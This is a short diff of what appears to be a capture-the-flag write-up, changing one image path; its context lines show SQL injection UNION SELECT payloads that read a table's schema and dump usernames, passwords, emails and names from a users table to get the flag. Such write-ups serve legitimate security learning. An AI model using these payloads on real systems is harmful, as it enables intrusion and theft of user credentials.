@@ -14,4 +14,4 @@ With `/api/profile/nonexistent' UNION SELECT sql,NULL,NULL,NULL,NULL,NULL,NULL F
 
 Lastly, I dumped most interesting columns from it, which are username, password, email and full_name, with: `/api/profile/nonexistent' UNION SELECT username,password,email,full_name,NULL,NULL,NULL FROM users--`, and in the response I saw the flag.
 
-![](Images/ottergram1.png)
+![](Images/ottergram-004.png)
